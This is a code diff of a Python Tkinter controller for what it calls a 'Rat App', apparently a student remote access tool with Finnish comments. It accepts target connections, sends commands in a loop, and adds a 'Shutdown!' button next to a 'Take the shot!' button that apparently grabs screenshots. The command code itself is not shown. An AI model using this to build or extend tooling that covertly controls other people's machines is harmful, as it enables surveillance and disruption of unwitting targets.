@@ -22,12 +22,12 @@ class MainServer(tk.Tk):
         #accept metodi palauttaa -> target == itse yhteys kohteeseen
         # # target_addr == tuple jossa index0 :ssa targetin ip ja index1:ssa väliaikaisportti
         print(f'[+] New connection from {self.client_addr[0]}')
-        
+
         self.command = Commands(self)
 
         # configure the root window
         self.title('Rat App')
-        self.iconbitmap('rat.png')
+        self.iconbitmap('rat.ico')
         self.geometry('300x100+500+500')
 
         # label
@@ -36,9 +36,10 @@ class MainServer(tk.Tk):
 
         # button
         self.button = ttk.Button(self, text='Take the shot!', command=self.command.button_clicked)
+        self.button2 = ttk.Button(self, text='Shutdown!', command=self.command.button2_clicked)
         #self.button['command'] = self.button_clicked
         self.button.pack(padx=20, pady=20)
-        
+        self.button2.pack(padx=20, pady=(0, 20))
        
         while True:
             #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
@@ -70,6 +71,6 @@ class MainServer(tk.Tk):
 
 
 if __name__ == "__main__":
-    appi = MainServer('127.0.0.1', 8888) #172.20.16.62 Jorma
+    appi = MainServer('127.0.0.1', 8888) #172.20.16.61 Jorma
     appi.mainloop()
 
